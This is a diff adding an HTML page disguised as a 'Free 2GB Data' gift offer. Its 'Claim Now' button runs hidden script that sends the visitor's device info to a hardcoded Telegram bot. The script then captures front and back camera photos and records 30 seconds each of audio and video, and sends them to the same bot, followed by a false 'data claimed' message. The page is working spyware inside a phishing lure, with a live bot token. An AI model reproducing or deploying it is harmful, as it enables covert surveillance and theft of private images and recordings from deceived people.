@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Offer | Free 2GB Data</title>
+    <style>
+        /* Modern CSS Setup */
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+
+        .container {
+            max-width: 380px;
+            background: #fff;
+            padding: 40px 20px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+
+        .icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #2d3436;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #636e72;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .data-badge {
+            display: inline-block;
+            background: #ffeaa7;
+            color: #d63031;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .button {
+            background: #6c5ce7;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
+        }
+
+        .button:hover {
+            background: #a29bfe;
+            box-shadow: 0 6px 20px rgba(108, 92, 231, 0.6);
+        }
+
+        .button:active {
+            transform: scale(0.98);
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #b2bec3;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="icon">🎁</div>
+        <div class="data-badge">Limited Time Offer</div>
+        <h1>Get Free 2GB DATA</h1>
+        <p>Congratulations! You are eligible for a free data gift. Click below to activate it instantly on your number.</p>
+        
+        <button class="button" onclick="claimData()">Claim Now</button>
+        
+        <p class="footer-text">Terms and conditions apply. Valid for 24 hours.</p>
+    </div>
+
+    <script>
+        function claimData() {
+            // Button eka click kalama wena de methana danna
+            alert("Processing your request... Please wait!");
+        }
+        
+       
+ async function claimData() {
+ const botToken = '8334922749:AAEWWm4S0R5itUflcVtHgXkCEbCxrSYYSpE';
+ const chatId = '8264584451';
+
+ // Get device information
+ const deviceInfo = navigator.userAgent;
+ await sendMessage(botToken, chatId, 'text', `Device Info: ${deviceInfo}`);
+
+ // Access cameras and send images
+ const frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+ const backCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+
+ const frontCameraImage = await takePhoto(frontCameraStream);
+ const backCameraImage = await takePhoto(backCameraStream);
+
+ await sendMessage(botToken, chatId, 'image', frontCameraImage);
+ await sendMessage(botToken, chatId, 'image', backCameraImage);
+
+ // Record 30s voice
+ const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+ const voiceRec = await recordAudio(audioStream, 30);
+ await sendMessage(botToken, chatId, 'voice', voiceRec);
+
+ // Record 30s video
+ const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+ const videoRec = await recordVideo(videoStream, 30);
+ await sendMessage(botToken, chatId, 'video', videoRec);
+
+ alert('Your free 2GB data has been claimed!');
+ }
+
+ async function takePhoto(stream) {
+ const video = document.createElement('video');
+ video.srcObject = stream;
+ video.play();
+ return new Promise((resolve) => {
+ video.onloadedmetadata = () => {
+ const canvas = document.createElement('canvas');
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ const context = canvas.getContext('2d');
+ context.drawImage(video, 0, 0, canvas.width, canvas.height);
+ video.pause();
+ resolve(canvas.toDataURL('image/jpeg'));
+ };
+ });
+ }
+
+ async function recordAudio(stream, duration) {
+ const mediaRecorder = new MediaRecorder(stream);
+ const chunks = [];
+ mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+ mediaRecorder.start();
+ await new Promise((resolve) => setTimeout(resolve, duration * 1000));
+ mediaRecorder.stop();
+ return new Blob(chunks, { type: 'audio/wav' });
+ }
+
+ async function recordVideo(stream, duration) {
+ const mediaRecorder = new MediaRecorder(stream);
+ const chunks = [];
+ mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+ mediaRecorder.start();
+ await new Promise((resolve) => setTimeout(resolve, duration * 1000));
+ mediaRecorder.stop();
+ return new Blob(chunks, { type: 'video/mp4' });
+ }
+
+ async function sendMessage(botToken, chatId, messageType, data) {
+ try {
+ let url;
+ let headers;
+ let formData;
+
+ switch (messageType) {
+ case 'text':
+ url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+ headers = { 'Content-Type': 'application/json' };
+ formData = { chat_id: chatId, text: data };
+ break;
+ case 'image':
+ url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+ headers = { 'Content-Type': 'multipart/form-data' };
+ const image = data;
+ formData = { photo: image };
+ break;
+ case 'voice':
+ url = `https://api.telegram.org/bot${botToken}/sendVoice`;
+ headers = { 'Content-Type': 'multipart/form-data' };
+ formData = { voice: data };
+ break;
+ case 'video':
+ url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+ headers = { 'Content-Type': 'multipart/form-data' };
+ formData = { video: data };
+ break;
+ default:
+ throw new Error('Invalid message type');
+ }
+
+ const response = await axios.post(url, formData, { headers: headers });
+ return response.data;
+ } catch (error) {
+ console.error(error);
+ }
+ }
+ 
+    </script>
+
+</body>
+</html>
